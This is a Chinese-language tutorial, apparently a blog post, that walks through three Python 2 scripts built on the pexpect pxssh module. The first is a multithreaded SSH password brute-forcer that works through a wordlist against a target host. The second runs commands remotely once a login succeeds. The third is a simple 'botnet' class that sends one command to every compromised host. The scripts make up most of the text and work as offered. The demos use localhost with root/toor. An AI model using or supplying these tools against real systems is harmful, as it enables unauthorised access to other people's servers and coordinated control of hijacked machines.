**目录**

[暴力破解SSH口令](#t0)

[SSH远端执行命令](#t1)

[构建僵尸网络](#t2)

* * *

> 环境：[Kali](https://so.csdn.net/so/search?q=Kali&spm=1001.2101.3001.7020) Linux  python 2.7.13

### 暴力破解SSH口令

Pxssh是pexpect库的[ssh](https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020)专用脚本，他能用预先写好的 login()、logout() 和 prompt() 等函数直接与SSH进行交互 。对于login()函数，如果执行成功则不会抛出异常，将显示消息表示密码已经找到并把表示密码已找到的全局布尔值设置为true，如果异常显示密码被拒绝则返回即可，如果异常显示socket为 "read\_nonblocking" 则可能是SSH服务器被大量的连接刷爆了，可以过会儿再试，如果异常显示pxssh命令提示符提取困难也应该过会儿再试一次。

```
# -*- coding: utf-8 -*-      
"""      
Created on Sat Nov  3 22:01:51 2018      
@author: 小谢      
"""      
from pexpect import pxssh      
import optparse      
import time      
from threading import *       1
maxConnection=5      #设置最大连接数      1
connection_lock=BoundedSemaphore(value=maxConnection)      1
global Found         #密码全局布尔值      1
Found=False              1
global Fails         #失败的次数      1
Fails=0                  1
def connect(host,user,password,release):        1
    try:      1
        s=pxssh.pxssh()   #实例化      2
        s.login(host,user,password)         #登录      2
        print '[+] Password Found：'+password  #如果不抛出异常，说明密码正确      2
        Found=True      2
    except Exception,e:          2
        if 'read_nonblocking' in str(e):     #主机被大量的SSH连接刷爆了      2
            Fails+=1      2
            time.sleep(5)      2
            connect(host,user,password,False)      2
        elif 'synchronize with original prompt' in str(e):      2
            time.sleep(1)      3
            connect(host,user,password,False)      3
    finally:      3
        if release:      3
            connection_lock.release()      #解锁线程      3
def main():      3
    parser=optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')      3
    parser.add_option('-H',dest='Host',type='string',help='target host')      3
    parser.add_option('-F',dest='passwdFile',type='string',help='password file')      3
    parser.add_option('-u',dest='user',type='string',help='the user')      3
    (options,args)=parser.parse_args()      4
    host=options.Host      4
    passwdFile=options.passwdFile      4
    user=options.user      4
    if host==None or passwdFile==None or user==None:      4
        print(parser.usage)      4
        exit(0)      4
    fn=open(passwdFile,'r')         #打开密码文件      4
    lines=fn.readlines()                  4
    for line in lines:      4
        if Found:      5
            print("[*] Exiting: Password Found")      5
            exit(0)      5
        if Fails>5:      5
            print("[!] Exiting: Too Many Socket Timeouts")      5
            exit(0)      5
        connection_lock.acquire()     #锁定线程      5
        password=line.strip("\n")      5
        print("[-] Testing："+str(password))      5
        t=Thread(target=connect,args=(host,user,password,True))  #开启密码爆破线程      5
        t.start()                       #启动线程      6
if __name__=='__main__':      6
    main()
```


![](https://img-blog.csdnimg.cn/20181103225214126.png)

但是这个脚本有一个bug就是，你第一次爆破主机如果有正确密码则会爆出出来，第二次爆破的话就算是有正确密码也不会爆破出来。(自己主机没有这种bug，爆破其他主机会出现这种bug)

### SSH远端执行命令

当我们破解了SSH的口令之后，我们就可以运行命令了。

```
# -*- coding: utf-8 -*-      
"""      
Created on Sat Nov  3 23:37:11 2018      
@author: 小谢      
"""      
from pexpect import pxssh      
def send_command(s,cmd):      
    s.sendline(cmd)   #发送命令给主机      
    s.prompt()        #匹配cmd执行后的下一步操作的命令提示符      1
    print s.before    #输出命令提示符之前的内容      1
def connect(host,user,password):      1
    try:      1
        s=pxssh.pxssh()      1
        s.login(host,user,password)    #登录      1
        return s                       #返回登录的session      1
    except:      1
        print '[-] Error Connecting'   #登录失败      1
        exit(0)                              1
s=connect('127.0.0.1','root','toor')      2
send_command(s,'uname -r')
```


![](https://img-blog.csdnimg.cn/20181103234528459.png)

这个脚本也是有这种bug，第一次可以正确执行命令，第二次就算用户名密码正确，也显示Error Connecting。 (自己主机没有这种bug，爆破其他主机会出现这种bug)

### 构建僵尸网络

既然可以控制一台，那么就可以控制多台，从而可以构建僵尸网络了！ 

我们创建了一个Client()类，为了构造client对象，需要主机名，用户名以及密码。同时，这个类还要包含维持与肉鸡连接所需的方法：connect() 、send\_command() 。Botnet全局数组记录了单个client对象，addClient()方法的输入是主机名，用户和密码并以此实例化一个client对象并将它添加到botnet数组中。botnetCommand()函数只要一个参数即要发布的命令，这函数遍历整个数组，把命令发送到botnet数组中的每个client上。

```
# -*- coding: utf-8 -*-      
"""      
Created on Fri Nov  2 22:41:45 2018      
@author: 小谢      
"""      
from pexpect import pxssh      
class Client:      
    def __init__(self,host,user,password):       #初始化对象      
        self.host=host      1
        self.user=user      1
        self.password=password      1
        self.session=self.connect()      1
    def connect(self):                          #ssh连接      1
        try:      1
            s=pxssh.pxssh()      1
            s.login(self.host,self.user,self.password)      1
            return s      1
        except Exception,e:      1
            print e      2
            print '[-] Error Connecting'      2
    def send_command(self,cmd):                     #发送命令      2
        self.session.sendline(cmd)      2
        self.session.prompt()      2
        return self.session.before      2
def botnetCommand(command):      2
    for client in botNet:      2
        output=client.send_command(command)      2
        print '[*] Output from '+ client.host      2
        print '[+] '+output      3
def addClient(host,user,password):      3
    client=Client(host,user,password)            #实例化对象      3
    botNet.append(client)      3
botNet=[]      3
addClient('127.0.0.1','root','toor')      3
addClient('127.0.0.1','root','toor')      3
addClient('127.0.0.1','root','toor')      3
botnetCommand("uname -a")
```


![](https://img-blog.csdnimg.cn/20181104095558768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[Python中的Pexpect模块的简单使用](https://blog.csdn.net/qq_36119192/article/details/83627813)

                  [Pexpect模块的使用](https://www.ibm.com/developerworks/cn/linux/l-cn-pexpect2/)